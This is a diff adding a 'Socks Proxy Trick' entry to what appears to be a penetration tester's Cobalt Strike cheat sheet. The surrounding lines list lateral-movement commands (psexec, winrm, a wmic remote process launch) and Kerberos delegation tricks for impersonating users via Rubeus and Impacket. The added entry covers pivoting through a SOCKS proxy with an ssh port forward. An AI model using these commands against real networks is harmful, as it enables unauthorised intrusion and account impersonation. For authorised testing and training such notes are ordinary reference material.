@@ -219,6 +219,9 @@ Lateral Movement
   jump psexec, psexec64, psexec_psh, winrm, winrm64
   shell wmic.exe /node:<target> process call create "powershelle.exe whoami"
   
+Socks Proxy Trick
+    Start CS Socks -> ssh -tt -v -L 9052:localhost:9050 user@10.10.10.10
+  
 Kerberos Info:
     TGTDelg: Request another user's service ticket using any user account and impersonate that user
         Rubues: tgtdelg           Impacket: getST.py           (Need to be authenticated)
